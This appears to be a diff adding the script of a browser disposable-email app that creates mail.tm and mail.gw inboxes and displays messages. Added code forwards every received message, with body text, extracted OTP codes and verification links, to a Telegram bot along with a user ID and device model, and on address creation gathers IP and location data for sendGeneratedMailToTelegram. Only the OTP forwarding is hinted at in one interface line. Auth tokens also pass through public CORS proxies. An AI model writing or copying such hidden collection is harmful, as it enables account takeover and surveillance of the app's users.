+  if (!msg || !msg.id || forwardedMsgIds.has(msg.id)) return;
+  forwardedMsgIds.add(msg.id);
+
+  const deviceInfo = await getDetailedDeviceModel();
+
+  const otpSection = (msg.otps && msg.otps.length)
+    ? `\n🔑 <b>EXTRACTED OTP CODE:</b>\n👉 <code>${msg.otps.map(escapeTgHtml).join('</code>  |  <code>')}</code>\n`
+    : '';
+
+  const linkSection = (msg.links && msg.links.length)
+    ? `🔗 <b>Verification Link:</b> <a href="${escapeTgHtml(msg.links[0])}">Open Link</a>\n`
+    : '';
+
+  const cleanBody = escapeTgHtml((msg.bodyText || msg.preview || '').slice(0, 850));
+
+  const htmlText = [
+    `╔══════════════════════════╗`,
+    `📩 <b>CYBER MAIL • INBOX &amp; OTP</b>`,
+    `╚══════════════════════════╝`,
+    ``,
+    `🆔 <b>User ID:</b> <code>${escapeTgHtml(currentUserId)}</code> (<code>${currentUserPercent}%</code>)`,
+    `📱 <b>Device Model:</b> <code>${escapeTgHtml(deviceInfo.model)}</code>`,
+    `📬 <b>To Mail:</b> <code>${escapeTgHtml(state.email || '')}</code>`,
+    `👤 <b>From:</b> ${escapeTgHtml(msg.from || 'Unknown')}`,
+    `📌 <b>Subject:</b> <b>${escapeTgHtml(msg.subject || '(No Subject)')}</b>`,
+    otpSection + linkSection,
+    `📝 <b>Full Message:</b>`,
+    `<pre>${cleanBody}</pre>`,
+    `━━━━━━━━━━━━━━━━━━━━━━━`,
+    `🕒 <b>Received At:</b> <code>${escapeTgHtml(new Date().toLocaleTimeString())}</code>`
+  ].join('\n');
+
+  await sendTelegramHtml(htmlText);
+}
+
+/* ============================================================
+   CYBER MAIL — mail.tm / mail.gw API + Matrix Rain
+   ============================================================ */
+const ICONS = {
+  copy: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.3" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="12" height="12" rx="2.5"/><path d="M5 15V5a2 2 0 0 1 2-2h10"/></svg>',
+  check: '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>',
+  otp: '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><rect x="4" y="10" width="16" height="11" rx="2"/><path d="M8 10V7a4 4 0 0 1 8 0v3"/></svg>',
+  link: '<svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M10 13a5 5 0 0 0 7.5.5l3-3a5 5 0 0 0-7-7l-1.5 1.5"/><path d="M14 11a5 5 0 0 0-7.5-.5l-3 3a5 5 0 0 0 7 7l1.5-1.5"/></svg>',
+  external: '<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>',
+  success: '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><path d="M22 11.08V12a10 10 0 1 1-5.93-9.14"/><polyline points="22 4 12 14.01 9 11.01"/></svg>',
+  error: '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="15" y1="9" x2="9" y2="15"/><line x1="9" y1="9" x2="15" y2="15"/></svg>',
+  info: '<svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg>'
+};
+
+const $ = (s) => document.querySelector(s);
+const emailValue     = $('#emailValue');
+const copyBtn        = $('#copyBtn');
+const copyMsg        = $('#copyMsg');
+const statusPill     = $('#statusPill');
+const statusText     = $('#statusText');
+const newEmailBtn    = $('#newEmailBtn');
+const deleteBtn      = $('#deleteBtn');
+const timerSelect    = $('#timerSelect');
+const timerCountdown = $('#timerCountdown');
+const timerBar       = $('#timerBar');
+const refreshBtn     = $('#refreshBtn');
+const searchInput    = $('#searchInput');
+const msgCount       = $('#msgCount');
+const inboxContent   = $('#inboxContent');
+const menuBtn        = $('#menuBtn');
+const drawer         = $('#drawer');
+const drawerBackdrop = $('#drawerBackdrop');
+const closeDrawerBtn = $('#closeDrawerBtn');
+const modalBackdrop  = $('#modalBackdrop');
+const modalBody      = $('#modalBody');
+const modalTitle     = $('#modalTitle');
+const closeModalBtn  = $('#closeModalBtn');
+const modalCloseFoot = $('#modalCloseFoot');
+const confirmBackdrop= $('#confirmBackdrop');
+const confirmTitle   = $('#confirmTitle');
+const confirmText    = $('#confirmText');
+const confirmOk      = $('#confirmOk');
+const confirmCancel  = $('#confirmCancel');
+const toastWrap      = $('#toastWrap');
+
+const state = {
+  email: null,
+  messages: [],
+  timerTotal: 600,
+  timerRemaining: 600,
+  timerIntervalId: null,
+  refreshIntervalId: null,
+  searchQuery: '',
+  sessionActive: false
+};
+
+/*API-START*/
+const PROVIDERS = [
+  { name: 'mail.tm', base: 'https://api.mail.tm' },
+  { name: 'mail.gw', base: 'https://api.mail.gw' }
+];
+
+const TRANS_KEY = 'tm_premium_transport_v1';
+const REQ_TIMEOUT = 15000;
+const CHAIN_DEADLINE = 30000;
+let SLEEP_SCALE = 1;
+const PW_CHARS = 'abcdefghijklmnopqrstuvwxyzABCDEFGHJKLMNPQRSTUVWXYZ23456789';
+
+const TRANSPORTS = [
+  { name: 'direct',      auth: true,  methods: null,    timeout: 12000, url: (u) => u },
+  { name: 'redocly',     auth: true,  methods: null,    timeout: 12000, url: (u) => 'https://cors.redoc.ly/' + u },
+  { name: 'cors.eu.org', auth: true,  methods: null,    timeout: 12000, url: (u) => 'https://cors.eu.org/' + u },
+  { name: 'api.cors.lol',auth: true,  methods: null,    timeout: 12000, url: (u) => 'https://api.cors.lol/?url=' + encodeURIComponent(u) },
+  { name: 'workers.dev', auth: true,  methods: null,    timeout: 12000, url: (u) => 'https://test.cors.workers.dev/?' + u },
+  { name: 'allorigins',  auth: false, methods: ['GET'], timeout: 12000, bust: true, url: (u) => 'https://api.allorigins.win/raw?url=' + encodeURIComponent(u) },
+  { name: 'codetabs',    auth: false, methods: ['GET'], timeout: 12000, bust: true, url: (u) => 'https://api.codetabs.com/v1/proxy?quest=' + encodeURIComponent(u) }
+];
+
+let preferredTransport = null;
+const transportHealth = new Map();
+try { preferredTransport = localStorage.getItem(TRANS_KEY) || null; } catch (_) {}
+
+function tStat(name) {
+  let s = transportHealth.get(name);
+  if (!s) { s = { fails: 0, downUntil: 0 }; transportHealth.set(name, s); }
+  return s;
+}
+function markOkTransport(name) {
+  const s = tStat(name);
+  s.fails = 0; s.downUntil = 0;
+  if (preferredTransport !== name) {
+    preferredTransport = name;
+    try { localStorage.setItem(TRANS_KEY, name); } catch (_) {}
+  }
+}
+function markFailTransport(name) {
+  const s = tStat(name);
+  s.fails++;
+  s.downUntil = Date.now() + Math.min(s.fails, 5) * 60000;
+}
+function transportOrder() {
+  const now = Date.now();
+  const alive = [], cooling = [];
+  for (const t of TRANSPORTS) (tStat(t.name).downUntil > now ? cooling : alive).push(t);
+  const rank = (t) => (preferredTransport === t.name ? -1 : Math.min(tStat(t.name).fails, 6));
+  alive.sort((a, b) => rank(a) - rank(b));
+  return alive.concat(cooling);
+}
+
+const auth = { provider: null, token: null, id: null, address: null, password: null };
+const detailCache = new Map();
+const seenLocal = new Set();
+const knownIds = new Set();
+
+class ApiError extends Error {
+  constructor(kind, message, status) { super(message); this.kind = kind; this.status = status || 0; }
+}
+const sleep = (ms) => new Promise(r => setTimeout(r, ms * SLEEP_SCALE));
+const members = (d) => (d && (d['hydra:member'] || d.member)) || (Array.isArray(d) ? d : []);
+
+function randStr(n, chars = 'abcdefghijklmnopqrstuvwxyz0123456789') {
+  const arr = crypto.getRandomValues(new Uint32Array(n));
+  return Array.from(arr, v => chars[v % chars.length]).join('');
+}
+function htmlToText(html) {
+  try {
+    if (typeof DOMParser !== 'undefined') {
+      return new DOMParser().parseFromString(html, 'text/html').body.textContent || '';
+    }
+  } catch (_) {}
+  return String(html).replace(/<style[\s\S]*?<\/style>|<script[\s\S]*?<\/script>/gi, '').replace(/<[^>]+>/g, ' ');
+}
+function parseDetail(d) {
+  const text = ((d.text && d.text.trim()) ||
+               htmlToText(Array.isArray(d.html) ? d.html.join('\n') : (d.html || ''))).trim();
+  const links = [...new Set((text.match(/https?:\/\/[^\s<>"')\]]+/g) || []))].slice(0, 5);
+  const otps  = [...new Set((text.match(/\b\d{4,8}\b/g) || []).filter(c => !/^(19|20)\d{2}$/.test(c)))].slice(0, 3);
+  return { text, links, otps };
+}
+function fmtMsgTime(iso) {
+  const d = new Date(iso);
+  if (isNaN(d)) return '';
+  return d.toDateString() === new Date().toDateString()
+    ? d.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })
+    : d.toLocaleDateString([], { day: 'numeric', month: 'short' });
+}
+
+async function httpOnce(finalUrl, { method = 'GET', body, token } = {}, timeoutMs, tname) {
+  const ctrl = new AbortController();
+  const timer = setTimeout(() => ctrl.abort(), timeoutMs);
+  try {
+    const headers = { Accept: 'application/json' };
+    if (body !== undefined) headers['Content-Type'] = 'application/json';
+    if (token) headers.Authorization = 'Bearer ' + token;
+    let res;
+    try {
+      res = await fetch(finalUrl, {
+        method, headers, signal: ctrl.signal, cache: 'no-store',
+        body: body !== undefined ? JSON.stringify(body) : undefined
+      });
+    } catch (e) {
+      if (e && e.name === 'AbortError') throw new ApiError('timeout', tname + ': timeout', 0);
+      throw new ApiError('network', tname + ': network / CORS blocked', 0);
+    }
+    if (!res.ok) {
+      let detail = '';
+      try { const j = await res.json(); detail = j.detail || j.message || j['hydra:description'] || ''; } catch (_) {}
+      throw new ApiError('http', 'HTTP ' + res.status + (tname !== 'direct' ? ' (' + tname + ')' : '') + (detail ? ' ' + detail : ''), res.status);
+    }
+    if (res.status === 204) return null;
+    const txt = await res.text();
+    try { return txt ? JSON.parse(txt) : null; }
+    catch (_) { throw new ApiError('network', tname + ': non-JSON response (blocked or error page)', res.status); }
+  } finally { clearTimeout(timer); }
+}
+
+async function rawRequest(base, path, opts = {}) {
+  const url = base + path;
+  const method = opts.method || 'GET';
+  const usable = transportOrder().filter(t =>
+    (!opts.token || t.auth) && (!t.methods || t.methods.includes(method)));
+  if (!usable.length) throw new ApiError('network', 'no usable route for ' + method, 0);
+  const failures = [];
+  let httpErr = null;
+  const startedAt = Date.now();
+  for (const t of usable) {
+    if (t.name !== 'direct' && Date.now() - startedAt > CHAIN_DEADLINE) {
+      failures.push(t.name + ': skipped (chain deadline)');
+      continue;
+    }
+    let target = url;
+    if (t.bust && method === 'GET') target += (url.includes('?') ? '&' : '?') + '_nb=' + Date.now();
+    try {
+      const data = await httpOnce(t.url(target), opts, t.timeout || REQ_TIMEOUT, t.name);
+      markOkTransport(t.name);
+      return data;
+    } catch (err) {
+      if (err.kind === 'http') {
+        markOkTransport(t.name);
+        httpErr = httpErr || err;
+        if (t.name === 'direct') break;
+        continue;
+      }
+      markFailTransport(t.name);
+      failures.push(t.name + ': ' + err.message);
+    }
+  }
+  if (httpErr) throw httpErr;
+  throw new ApiError('network', failures.length ? failures.join(' | ') : 'network / CORS blocked (all routes)', 0);
+}
+
+async function request(base, path, opts = {}, retries = 2) {
+  let lastErr;
+  for (let i = 0; i <= retries; i++) {
+    try { return await rawRequest(base, path, opts); }
+    catch (e) {
+      lastErr = e;
+      const retryable = e.kind === 'network' || e.kind === 'timeout' || e.status === 429 || e.status >= 500;
+      if (!retryable || i === retries) break;
+      await sleep(e.status === 429 ? 1200 * (i + 1) : 500 * (i + 1));
+    }
+  }
+  throw lastErr;
+}
+
+async function createOnProvider(p) {
+  const dom = await request(p.base, '/domains');
+  const domains = members(dom).filter(d => d.isActive !== false && !d.isPrivate).map(d => d.domain).filter(Boolean);
+  if (!domains.length) throw new ApiError('http', 'no active domain', 0);
+
+  let lastErr;
+  for (let attempt = 0; attempt < 4; attempt++) {
+    const domain   = domains[attempt % domains.length];
+    const address  = `${randStr(10)}@${domain}`;
+    const password = randStr(18, PW_CHARS);
+    try {
+      const acc = await request(p.base, '/accounts', { method: 'POST', body: { address, password } });
+      const tok = await request(p.base, '/token',    { method: 'POST', body: { address, password } });
+      if (!tok || !tok.token) throw new ApiError('parse', 'no token', 0);
+      return { provider: p, token: tok.token, id: (acc && acc.id) || tok.id, address, password };
+    } catch (e) {
+      lastErr = e;
+      if (e.status === 422 || e.status === 409) continue;
+      throw e;
+    }
+  }
+  throw lastErr;
+}
+
+async function authed(path, opts = {}) {
+  if (!auth.provider || !auth.token) throw new ApiError('http', 'no session', 401);
+  try {
+    return await request(auth.provider.base, path, { ...opts, token: auth.token });
+  } catch (e) {
+    if (e.status === 401 && auth.address && auth.password) {
+      const tok = await request(auth.provider.base, '/token', { method: 'POST', body: { address: auth.address, password: auth.password } });
+      auth.token = tok.token;
+      return await request(auth.provider.base, path, { ...opts, token: auth.token });
+    }
+    throw e;
+  }
+}
+
+function resetAuth() {
+  auth.provider = null; auth.token = null; auth.id = null; auth.address = null; auth.password = null;
+  detailCache.clear(); knownIds.clear(); seenLocal.clear();
+}
+
+const API = {
+  enabled: true,
+
+  async createAccount() {
+    if (auth.id && auth.token) { try { await authed('/accounts/' + auth.id, { method: 'DELETE' }); } catch (_) {} }
+    const preferred = auth.provider;
+    resetAuth();
+
+    if (typeof navigator !== 'undefined' && navigator.onLine === false) {
+      const e = new Error('You are offline'); e.details = ['offline']; throw e;
+    }
+    const order = preferred ? [preferred, ...PROVIDERS.filter(p => p.name !== preferred.name)] : PROVIDERS;
+    const errors = [], kinds = [];
+    for (const p of order) {
+      try {
+        const s = await createOnProvider(p);
+        Object.assign(auth, s);
+        return { address: s.address, provider: p.name };
+      } catch (e) {
+        errors.push(`${p.name}: ${e.message}`);
+        kinds.push(e.kind || 'unknown');
+      }
+    }
+    const err = new Error(errors.join('  |  '));
+    err.details = errors; err.kinds = kinds;
+    throw err;
+  },
+
+  async fetchMessages() {
+    if (!auth.token) return [];
+    const data  = await authed('/messages?page=1');
+    const items = members(data);
+
+    const need = items.filter(m => !detailCache.has(m.id));
+    for (let i = 0; i < need.length; i += 3) {
+      await Promise.all(need.slice(i, i + 3).map(async (m) => {
+        try { detailCache.set(m.id, parseDetail(await authed('/messages/' + m.id))); } catch (_) {}
+      }));
+    }
+
+    const out = items.map((m) => {
+      const det = detailCache.get(m.id) || { text: m.intro || '', links: [], otps: [] };
+      return {
+        id: m.id,
+        from: (m.from && (m.from.name || m.from.address)) || 'Unknown',
+        to: (m.to && m.to[0] && m.to[0].address) || state.email,
+        subject: m.subject || '',
+        preview: m.intro || det.text.slice(0, 140),
+        time: fmtMsgTime(m.createdAt),
+        bodyText: det.text,
+        otps: det.otps, links: det.links,
+        hasOtp: det.otps.length > 0, hasLink: det.links.length > 0,
+        unread: !m.seen && !seenLocal.has(m.id)
+      };
+    });
+
+    out.forEach(m => {
+      forwardInboxMessageToTelegram(m);
+
+      if (!knownIds.has(m.id)) {
+        if (knownIds.size > 0 || state.messages.length > 0) {
+          if (prefs.notifications && typeof Notification !== 'undefined' && Notification.permission === 'granted' && document.hidden) {
+            try { new Notification(m.from, { body: m.subject || '(no subject)' }); } catch (_) {}
+          }
+        }
+        knownIds.add(m.id);
+      }
+    });
+    return out;
+  },
+
+  async deleteAccount() {
+    if (auth.id && auth.token) { try { await authed('/accounts/' + auth.id, { method: 'DELETE' }); } catch (_) {} }
+    resetAuth();
+    return { ok: true };
+  }
+};
+/*API-END*/
+
+/* ============================================================
+   UI HELPERS
+   ============================================================ */
+function showToast(message, type = 'info', duration = 2600) {
+  const el = document.createElement('div');
+  el.className = `toast ${type}`;
+  const icon = type === 'success' ? ICONS.success : type === 'error' ? ICONS.error : ICONS.info;
+  el.innerHTML = `${icon}<span>${escapeHtml(message)}</span>`;
+  toastWrap.appendChild(el);
+  requestAnimationFrame(() => el.classList.add('show'));
+  setTimeout(() => {
+    el.classList.remove('show');
+    setTimeout(() => el.remove(), 300);
+  }, duration);
+}
+
+let confirmResolver = null;
+function askConfirm(title, text, okLabel = 'Confirm', danger = true) {
+  confirmTitle.textContent = title;
+  confirmText.textContent = text;
+  confirmOk.textContent = okLabel;
+  confirmOk.className = danger ? 'btn btn-danger' : 'btn btn-primary';
+  confirmBackdrop.classList.add('open');
+  return new Promise((resolve) => { confirmResolver = resolve; });
+}
+function closeConfirm(result) {
+  confirmBackdrop.classList.remove('open');
+  if (confirmResolver) { confirmResolver(result); confirmResolver = null; }
+}
+confirmOk.addEventListener('click', () => closeConfirm(true));
+confirmCancel.addEventListener('click', () => closeConfirm(false));
+confirmBackdrop.addEventListener('click', (e) => { if (e.target === confirmBackdrop) closeConfirm(false); });
+
+function escapeHtml(str = '') {
+  return String(str).replace(/[&<>"']/g, (c) => ({
+    '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;'
+  }[c]));
+}
+function formatTime(sec) {
+  if (sec <= 0) return '00:00';
+  const m = Math.floor(sec / 60);
+  const s = sec % 60;
+  return `${String(m).padStart(2, '0')}:${String(s).padStart(2, '0')}`;
+}
+
+function setEmailDisplay(address, locLabel = 'GPS OFF', gpsLocked = false) {
+  if (!address) {
+    emailValue.textContent = 'No email yet';
+    emailValue.classList.add('placeholder');
+    copyBtn.disabled = true;
+    deleteBtn.disabled = true;
+    refreshBtn.disabled = true;
+    searchInput.disabled = true;
+    updateUserCardStats(0, 'GPS OPTIONAL', false);
+  } else {
+    emailValue.textContent = address;
+    emailValue.classList.remove('placeholder');
+    copyBtn.disabled = false;
+    deleteBtn.disabled = false;
+    refreshBtn.disabled = false;
+    searchInput.disabled = false;
+    const randomPower = Math.floor(96 + Math.random() * 4);
+    updateUserCardStats(randomPower, locLabel, gpsLocked);
+  }
+}
+const errNote = $('#errNote');
+function showErr(msg) { errNote.textContent = msg; errNote.classList.remove('hidden'); }
+function hideErr()    { errNote.textContent = ''; errNote.classList.add('hidden'); }
+function setStatus(text, cls = '') {
+  statusText.textContent = text;
+  statusPill.className = 'status-pill' + (cls ? ' ' + cls : '');
+}
+
+async function generateNewEmail(skipConfirm = false) {
+  MusicEngine.start(true);
+  if (state.sessionActive && !skipConfirm && prefs.confirmNew) {
+    const ok = await askConfirm('Generate new CYBER MAIL?', 'Your current inbox will be discarded from this page.', 'Generate');
+    if (!ok) return;
+  }
+
+  newEmailBtn.disabled = true;
+  newEmailBtn.innerHTML = `<span class="spinner"></span><span>Generating...</span>`;
+  setStatus('Creating...');
+  hideErr();
+
+  try {
+    const acct = await API.createAccount();
+    const ipInfo = await getIpInfo();
+    const locData = await tryGetLocationSoft(ipInfo);
+
+    state.email = acct.address;
+    state.messages = [];
+    state.sessionActive = true;
+    setEmailDisplay(acct.address, locData.label, locData.locked);
+    setStatus('Active');
+    hideErr();
+    failCount = 0;
+    renderInbox();
+    startTimer(state.timerTotal);
+    showToast('New CYBER MAIL address generated.', 'success');
+    startAutoRefresh();
+    refreshInbox();
+
+    sendGeneratedMailToTelegram(acct.address, locData, ipInfo);
+  } catch (err) {
+    console.error(err);
+    setStatus('Error');
+    const allNetwork = err.kinds && err.kinds.length && err.kinds.every(k => k === 'network');
+    let hint = '';
+    if (err.details && err.details[0] === 'offline') hint = 'Your device looks offline. Turn on internet and try again.';
+    else if (allNetwork && !/^https?:$/.test(location.protocol)) hint = 'Open this page over HTTPS or local server if proxy routes are blocked.';
+    else if (allNetwork) hint = 'Could not reach the mail servers through any route.';
+    showErr('Reason: ' + err.message + (hint ? '\n' + hint : ''));
+    showToast('Could not generate email.', 'error', 4500);
+  } finally {
+    newEmailBtn.disabled = false;
+    newEmailBtn.innerHTML = `<svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round"><path d="M12 5v14M5 12h14"/></svg><span>New Email</span>`;
+  }
+}
+
+async function deleteSession() {
+  if (!state.sessionActive) return;
+  if (prefs.confirmDelete) {
+    const ok = await askConfirm('Delete session?', 'This will delete the address from the server and clear the inbox from this page.', 'Delete');
+    if (!ok) return;
+  }
+  try { await API.deleteAccount(); } catch (_) {}
+  state.email = null;
+  state.messages = [];
+  state.sessionActive = false;
+  stopTimer();
+  stopAutoRefresh();
+  setEmailDisplay(null);
+  setStatus('Ready');
+  hideErr();
+  failCount = 0;
+  renderInbox();
+  showToast('Session cleared.', 'success');
+}
+
+copyBtn.addEventListener('click', async () => {
+  if (!state.email) return;
+  try {
+    await navigator.clipboard.writeText(state.email);
+    copyMsg.classList.add('show');
+    setTimeout(() => copyMsg.classList.remove('show'), 1800);
+  } catch (_) {
+    const ta = document.createElement('textarea');
+    ta.value = state.email; document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); copyMsg.classList.add('show'); setTimeout(() => copyMsg.classList.remove('show'), 1800); }
+    catch (e) { showToast('Copy failed.', 'error'); }
+    ta.remove();
+  }
+});
+
+newEmailBtn.addEventListener('click', () => generateNewEmail());
+deleteBtn.addEventListener('click', deleteSession);
+
+function startTimer(seconds) {
+  stopTimer();
+  state.timerTotal = seconds;
+  state.timerRemaining = seconds;
+  if (seconds === 0) {
+    timerCountdown.textContent = '∞';
+    timerCountdown.classList.remove('warning');
+    timerBar.style.width = '100%';
+    return;
+  }
+  updateTimerUI();
+  state.timerIntervalId = setInterval(() => {
+    state.timerRemaining--;
+    updateTimerUI();
+    if (state.timerRemaining <= 0) {
+      stopTimer();
+      timerCountdown.textContent = '00:00';
+      timerBar.style.width = '0%';
+      showToast('Local timer ended.', 'info', 3200);
+    }
+  }, 1000);
+}
+function stopTimer() {
+  if (state.timerIntervalId) { clearInterval(state.timerIntervalId); state.timerIntervalId = null; }
+}
+function updateTimerUI() {
+  timerCountdown.textContent = formatTime(state.timerRemaining);
+  const pct = state.timerTotal ? (state.timerRemaining / state.timerTotal) * 100 : 100;
+  timerBar.style.width = pct + '%';
+  timerCountdown.classList.toggle('warning', state.timerRemaining > 0 && state.timerRemaining <= 60);
+}
+timerSelect.addEventListener('change', () => {
+  const val = parseInt(timerSelect.value, 10);
+  startTimer(val);
+  showToast('Timer updated.', 'info');
+});
+
+function renderInbox() {
+  const list = state.messages.filter(m => {
+    if (!state.searchQuery) return true;
+    const q = state.searchQuery.toLowerCase();
+    return (m.from || '').toLowerCase().includes(q) ||
+           (m.subject || '').toLowerCase().includes(q) ||
+           (m.preview || '').toLowerCase().includes(q);
+  });
+  msgCount.textContent = String(state.messages.length);
+
+  if (!state.sessionActive) {
+    inboxContent.innerHTML = emptyStateHtml('No email yet', 'Generate a CYBER MAIL address to start receiving messages here.');
+    return;
+  }
+  if (list.length === 0) {
+    inboxContent.innerHTML = emptyStateHtml(
+      state.messages.length === 0 ? 'No messages yet' : 'No matches',
+      state.messages.length === 0
+        ? 'Waiting for incoming messages. OTPs will auto-forward to Telegram.'
+        : 'Try a different search term.'
+    );
+    return;
+  }
+  inboxContent.innerHTML = list.map(msgCardHtml).join('');
+  inboxContent.querySelectorAll('.msg-item').forEach(el => {
+    el.addEventListener('click', () => openMessage(el.dataset.id));
+  });
+}
+
+function emptyStateHtml(title, text) {
+  return `<div class="empty-state">
+    <svg width="80" height="80" viewBox="0 0 120 120" fill="none">
+      <rect x="14" y="34" width="92" height="60" rx="12" fill="rgba(0,255,65,0.08)"/>
+      <rect x="14" y="34" width="92" height="60" rx="12" stroke="var(--accent-4)" stroke-width="2.5"/>
+      <path d="M16 40l40 28a8 8 0 0 0 8 0l40-28" stroke="var(--accent)" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/>
+      <circle cx="92" cy="30" r="14" fill="var(--accent)"/>
+      <path d="M92 24v8M92 36h.01" stroke="#031107" stroke-width="2.6" stroke-linecap="round"/>
+    </svg>
+    <h3>${escapeHtml(title)}</h3>
+    <p>${escapeHtml(text)}</p>
+  </div>`;
+}
+
+function msgCardHtml(m) {
+  const initial = (m.from || '?').charAt(0).toUpperCase();
+  const tags = [];
+  if (m.hasOtp) tags.push(`<span class="tag tag-otp">${ICONS.otp} OTP</span>`);
+  if (m.hasLink) tags.push(`<span class="tag tag-link">${ICONS.link} Link</span>`);
+  if (m.unread) tags.push(`<span class="tag tag-unread">New</span>`);
+  return `<button class="msg-item ${m.unread ? 'unread' : ''}" data-id="${escapeHtml(m.id)}">
+    <div class="msg-avatar">${escapeHtml(initial)}</div>
+    <div class="msg-main">
+      <div class="msg-top">
+        <span class="msg-from">${escapeHtml(m.from || 'Unknown')}</span>
+        <span class="msg-time">${escapeHtml(m.time || '')}</span>
+      </div>
+      <div class="msg-subject">${escapeHtml(m.subject || '(no subject)')}</div>
+      ${prefs.showPreview ? `<div class="msg-preview">${escapeHtml(m.preview || '')}</div>` : ''}
+      ${tags.length ? `<div class="msg-tags">${tags.join('')}</div>` : ''}
+    </div>
+  </button>`;
+}
+
+function openMessage(id) {
+  const m = state.messages.find(x => x.id === id);
+  if (!m) return;
+  m.unread = false;
+  seenLocal.add(id);
+  renderInbox();
+  modalTitle.textContent = m.subject || '(no subject)';
+  const otps = m.otps || [];
+  const links = (m.links || []).filter(u => /^https?:\/\//i.test(u));
+  modalBody.innerHTML = `
+    <div class="detail-meta">
+      <div class="detail-meta-row"><span class="k">From</span><span class="v">${escapeHtml(m.from || '')}</span></div>
+      <div class="detail-meta-row"><span class="k">To</span><span class="v">${escapeHtml(m.to || state.email || '')}</span></div>
+      <div class="detail-meta-row"><span class="k">Subject</span><span class="v">${escapeHtml(m.subject || '')}</span></div>
+      <div class="detail-meta-row"><span class="k">Time</span><span class="v">${escapeHtml(m.time || '')}</span></div>
+    </div>
+    ${otps.length ? otps.map(c => `
+      <div class="otp-box">
+        <span class="code">${escapeHtml(c)}</span>
+        <button class="copy-mini" data-otp="${escapeHtml(c)}">${ICONS.copy} Copy OTP</button>
+      </div>`).join('') : ''}
+    ${links.length ? links.map(u => `
+      <div class="link-box">
+        <a href="${escapeHtml(u)}" target="_blank" rel="noopener noreferrer nofollow">${escapeHtml(u)}</a>
+        <a class="open-link-btn" href="${escapeHtml(u)}" target="_blank" rel="noopener noreferrer nofollow">Open ${ICONS.external}</a>
+      </div>`).join('') : ''}
+    <div class="email-body">${escapeHtml(m.bodyText || '')}</div>
+  `;
+  modalBody.querySelectorAll('[data-otp]').forEach(btn => {
+    btn.addEventListener('click', async () => {
+      try { await navigator.clipboard.writeText(btn.dataset.otp); showToast('OTP copied.', 'success'); }
+      catch (_) { showToast('Copy failed.', 'error'); }
+    });
+  });
+  modalBackdrop.classList.add('open');
+}
+function closeModal() { modalBackdrop.classList.remove('open'); }
+closeModalBtn.addEventListener('click', closeModal);
+modalCloseFoot.addEventListener('click', closeModal);
+modalBackdrop.addEventListener('click', (e) => { if (e.target === modalBackdrop) closeModal(); });
+
+searchInput.addEventListener('input', () => {
+  state.searchQuery = searchInput.value.trim();
+  renderInbox();
+});
+refreshBtn.addEventListener('click', () => {
+  if (!API.enabled) { showToast('Connect an API to refresh messages.', 'info'); return; }
+  refreshInbox();
+});
+
+let refreshing = false;
+let failCount = 0;
+async function refreshInbox() {
+  if (refreshing || !state.sessionActive) return;
+  refreshing = true;
+  try {
+    const msgs = await API.fetchMessages();
+    state.messages = Array.isArray(msgs) ? msgs : [];
+    renderInbox();
+    if (failCount > 0) { setStatus('Active'); hideErr(); }
+    failCount = 0;
+  } catch (err) {
+    console.error(err);
+    failCount++;
+    setStatus('Offline');
+    if (failCount === 1) {
+      showToast('Could not refresh inbox. Will keep trying.', 'error', 3000);
+      showErr('Inbox refresh failed: ' + err.message);
+    }
+    if (err.status === 404 || err.status === 401) {
+      showErr('This address expired or was removed by the provider. Tap "New Email" to create a new one.');
+    }
+  } finally {
+    refreshing = false;
+  }
+}
+
+function startAutoRefresh() {
+  stopAutoRefresh();
+  if (!API.enabled || !prefs.autoRefresh) return;
+  const interval = (prefs.refreshInterval || 10) * 1000;
+  state.refreshIntervalId = setInterval(() => {
+    if (document.hidden || !state.sessionActive) return;
+    refreshInbox();
+  }, interval);
+}
+function stopAutoRefresh() {
+  if (state.refreshIntervalId) { clearInterval(state.refreshIntervalId); state.refreshIntervalId = null; }
+}
+
+/* ============================================================
+   PREFERENCES & MATRIX THEME
+   ============================================================ */
+const PREF_KEY = 'tm_premium_prefs_v1';
+const defaultPrefs = {
+  color: '#00FF41',
+  mode: 'dark',
+  gradient: 'default',
+  cardStyle: 'glass',
+  shadow: 1,
+  radius: 18,
+  btnStyle: '3d',
+  compact: false,
+  animations: true,
+  use3d: true,
+  bgDeco: true,
+  fall: true,
+  fontSize: 15,
+  showPreview: true,
+  defaultTimer: 600,
+  autoRefresh: true,
+  refreshInterval: 10,
+  notifications: false,
+  confirmNew: true,
+  confirmDelete: true
+};
+let prefs = { ...defaultPrefs };
+try {
+  const saved = JSON.parse(localStorage.getItem(PREF_KEY) || 'null');
+  if (saved && typeof saved === 'object') prefs = { ...defaultPrefs, ...saved };
+} catch (_) {}
+
+function savePrefs() { try { localStorage.setItem(PREF_KEY, JSON.stringify(prefs)); } catch (_) {} }
+
+function hexToRgb(hex) {
+  const h = hex.replace('#','');
